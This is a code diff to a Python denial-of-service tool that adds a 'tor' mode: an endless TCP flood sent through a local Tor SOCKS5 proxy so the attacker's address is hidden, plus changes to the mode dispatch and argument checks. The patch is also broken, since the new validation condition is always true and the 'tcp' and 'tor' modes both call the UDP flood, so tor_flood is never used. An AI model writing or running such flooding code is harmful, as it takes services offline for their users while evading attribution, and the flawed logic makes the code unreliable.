@@ -7,6 +7,7 @@ import os
 import sys
 import time
 import socket
+import socks
 from threading import Thread
 from colorama import Fore
 from argparse import ArgumentParser
@@ -27,6 +28,21 @@ class Dos():
 
         size = os.urandom(min(65507, buffer_size))
         return size
+
+    def tor_flood(self, ip, port, buffer_size):
+        """ TCP flood over TOR. You need a running tor service on 'localhost' and default port (9050) """
+
+        print(GREEN + "TOR flood loaded » Firing up target [{}]:[{}] with a packet size of [{}]".format(ip, port,buffer_size))
+        while True:
+            try:
+                data = self.size(buffer_size)
+                with socks.socksocket() as sock:
+                    sock.set_proxy(proxy_type=socks.SOCKS5, addr="localhost", port=9050)
+                    sock.connect((ip, port))
+                    sock.send(data)
+            except Exception:
+                print(RED + "Error in TOR" + RESET)
+                sys.exit(0)
 
     def tcp_flood(self, ip, port, buffer_size):
         """ TCP flood function """
@@ -99,7 +115,7 @@ class Controller(Dos):
 
         if args.target_addr and args.port and args.dos_mode and args.amount and args.buffer_size:
             try:
-                if args.dos_mode != 'udp' and 'tcp': raise Exception
+                if args.dos_mode != 'udp' or 'tcp' or 'tor': raise Exception
                 elif args.port > 35535: raise Exception
                 elif args.buffer_size > 65507: raise Exception
                 return True
@@ -126,6 +142,8 @@ class Controller(Dos):
         if dos_mode == 'tcp':
             self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
         elif dos_mode == 'udp':
+            self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
+        elif dos_mode == 'tor':
             self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
         try:
             for nr in range(int(amount)):
